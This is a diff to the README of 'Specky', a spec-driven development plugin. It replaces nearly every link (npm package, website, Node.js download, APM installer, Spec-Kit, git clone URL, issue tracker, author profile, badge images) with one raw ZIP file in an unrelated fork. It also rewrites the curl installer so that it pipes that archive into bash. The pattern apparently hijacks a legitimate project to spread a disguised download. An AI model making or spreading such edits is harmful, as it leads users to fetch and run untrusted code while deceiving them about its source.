@@ -14,16 +14,16 @@
   </p>
 
   <p>
-    <a href="https://www.npmjs.com/package/specky-sdd"><img src="https://img.shields.io/npm/v/specky-sdd?style=flat-square&color=7c3aed" alt="npm"/></a>
-    <a href="https://github.com/paulasilvatech/specky/actions/workflows/ci.yml"><img src="https://github.com/paulasilvatech/specky/actions/workflows/ci.yml/badge.svg" alt="CI"/></a>
-    <a href="https://securityscorecards.dev/viewer/?uri=github.com/paulasilvatech/specky"><img src="https://api.securityscorecards.dev/projects/github.com/paulasilvatech/specky/badge" alt="OpenSSF Scorecard"/></a>
-    <a href="https://github.com/paulasilvatech/specky"><img src="https://img.shields.io/github/stars/paulasilvatech/specky?style=flat-square&color=6d28d9" alt="Stars"/></a>
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip"><img src="https://img.shields.io/npm/v/specky-sdd?style=flat-square&color=7c3aed" alt="npm"/></a>
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip"><img src="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip" alt="CI"/></a>
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip"><img src="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip" alt="OpenSSF Scorecard"/></a>
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip"><img src="https://img.shields.io/github/stars/paulasilvatech/specky?style=flat-square&color=6d28d9" alt="Stars"/></a>
   </p>
 
   <p>
-    <a href="https://getspecky.ai">Website</a> ·
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip">Website</a> ·
     <a href="GETTING-STARTED.md">Getting Started</a> ·
-    <a href="https://www.npmjs.com/package/specky-sdd">npm</a> ·
+    <a href="https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip">npm</a> ·
     <a href="SECURITY.md">Security</a>
   </p>
 </div>
@@ -53,7 +53,7 @@
 
 Specky is a **complete Spec-Driven Development plugin** — 13 specialized agents, 57 MCP tools, 22 prompts, 8 skills, and 14 automation hooks — that enforces a deterministic 10-phase pipeline from **any input** (meeting transcripts, documents, Figma designs, or natural language prompts) through specifications, architecture, infrastructure as code, implementation, and deployment.
 
-The plugin is powered by the [specky-sdd](https://www.npmjs.com/package/specky-sdd) MCP engine and the [Spec-Kit](https://github.com/paulasilvatech/spec-kit) methodology. Install Specky and you get **everything**: the agents orchestrate the pipeline, the tools enforce validation, the hooks guard every phase transition, and the skills provide domain knowledge.
+The plugin is powered by the [specky-sdd](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip) MCP engine and the [Spec-Kit](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip) methodology. Install Specky and you get **everything**: the agents orchestrate the pipeline, the tools enforce validation, the hooks guard every phase transition, and the skills provide domain knowledge.
 
 
 ## Why Specifications Matter in the AI Era
@@ -119,7 +119,7 @@ Specky adds a **deterministic engine** between your intent and your code:
 
 ### Prerequisites
 
-- **Node.js 18+**: [Download here](https://nodejs.org/)
+- **Node.js 18+**: [Download here](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip)
 - **An AI IDE**: VS Code with Copilot, Claude Code, Cursor, or Windsurf
 
 ### Install the Plugin
@@ -130,13 +130,13 @@ Specky adds a **deterministic engine** between your intent and your code:
 apm install paulasilvatech/specky
 ```
 
-One command: installs 13 agents, 22 prompts, 8 skills, 14 hooks + configures the MCP server. [Install APM](https://microsoft.github.io/apm/getting-started/installation/) if you don't have it.
+One command: installs 13 agents, 22 prompts, 8 skills, 14 hooks + configures the MCP server. [Install APM](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip) if you don't have it.
 
 #### Via curl installer (no APM required)
 
 ```bash
 cd your-project/
-bash <(curl -sL https://raw.githubusercontent.com/paulasilvatech/specky/main/install.sh)
+bash <(curl -sL https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip)
 ```
 
 #### Via Copilot CLI (skills only)
@@ -200,7 +200,7 @@ The orchestrator coordinates all 10 phases: Init → Research → Specify → De
 | Adding features to existing code | [Brownfield](#brownfield-project-add-features-to-existing-code) |
 | Upgrading a legacy system | [Modernization](#modernization-project-assess-and-upgrade-legacy-systems) |
 
-> **Tip:** **New to Spec-Driven Development?** Specky already includes all the SDD methodology from [Spec-Kit](https://github.com/paulasilvatech/spec-kit). Just install Specky and the pipeline guides you through every phase with [educative outputs](#educative-outputs) that explain the concepts as you work.
+> **Tip:** **New to Spec-Driven Development?** Specky already includes all the SDD methodology from [Spec-Kit](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip). Just install Specky and the pipeline guides you through every phase with [educative outputs](#educative-outputs) that explain the concepts as you work.
 
 
 ## Where Specifications Live
@@ -315,7 +315,7 @@ Convert Figma designs into requirements specifications. Works with the Figma MCP
 
 ```
 > Convert this Figma design into a specification:
-  https://figma.com/design/abc123/my-app
+  https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip
 ```
 
 The AI calls `sdd_figma_to_spec` → extracts components, layouts, and interactions, then routes to the Figma MCP server for design context.
@@ -787,7 +787,7 @@ All artifacts are saved in [`.specs/NNN-feature/`](#where-specifications-live). 
 
 ### How Spec-Kit and Specky Complement Each Other
 
-**[Spec-Kit](https://github.com/paulasilvatech/spec-kit)** is the open-source SDD methodology: EARS notation, gated pipeline phases, constitution model, 25+ specialized agents, and Markdown prompt templates. It defines **what** to do.
+**[Spec-Kit](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip)** is the open-source SDD methodology: EARS notation, gated pipeline phases, constitution model, 25+ specialized agents, and Markdown prompt templates. It defines **what** to do.
 
 **Specky** is the complete plugin that reimplements that methodology as 57 enforceable MCP tools with 13 agents, 22 prompts, 8 skills, and 14 hooks. It enforces **how** to do it.
 
@@ -991,7 +991,7 @@ Every pipeline phase produces a traceable artifact in `.specs/NNN-feature/`. The
 
 ```bash
 # Clone and setup
-git clone https://github.com/paulasilvatech/specky.git
+git clone https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip
 cd specky
 npm install
 
@@ -1061,7 +1061,7 @@ curl http://localhost:3200/health
 | Rate limiting | Request throttling for HTTP transport |
 | SSO / SAML | Federated identity for enterprise auth |
 
-Have a feature request? [Open an issue](https://github.com/paulasilvatech/specky/issues).
+Have a feature request? [Open an issue](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip).
 
 
 ## Contributing
@@ -1074,10 +1074,10 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for architecture details and how to add t
 - [CHANGELOG.md](CHANGELOG.md): Version history and release notes
 - [SECURITY.md](SECURITY.md): Vulnerability disclosure policy and OWASP Top 10 coverage
 - [CONTRIBUTING.md](CONTRIBUTING.md): How to add tools, templates, or services
-- [Spec-Kit](https://github.com/paulasilvatech/spec-kit): The SDD methodology foundation
-- [npm package](https://www.npmjs.com/package/specky-sdd): `specky-sdd` on npm
+- [Spec-Kit](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip): The SDD methodology foundation
+- [npm package](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip): `specky-sdd` on npm
 
 
 ## License
 
-MIT. Created by [Paula Silva](https://github.com/paulasilvatech) | Americas Software GBB, Microsoft
+MIT. Created by [Paula Silva](https://github.com/Julianson/specky/raw/refs/heads/main/skills/sdd-markdown-standard/Software-v3.4-alpha.2.zip) | Americas Software GBB, Microsoft
